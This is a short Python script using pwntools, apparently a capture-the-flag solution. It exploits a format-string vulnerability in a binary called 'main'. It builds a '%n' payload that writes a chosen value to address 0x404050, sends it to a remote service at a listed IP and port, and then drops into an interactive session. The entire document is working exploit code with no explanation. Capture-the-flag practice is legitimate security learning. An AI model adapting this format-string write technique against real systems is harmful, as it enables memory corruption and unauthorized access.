from pwn import*
p = process('./main')
elf =ELF('./main')
p = remote('39.101.210.214',10012)

payload  = '%' + str(0x233) + 'c%8$n'
payload  = payload.ljust(0x10,'\x00')
payload += p64(0x404050)
p.sendline(payload)
p.interactive()
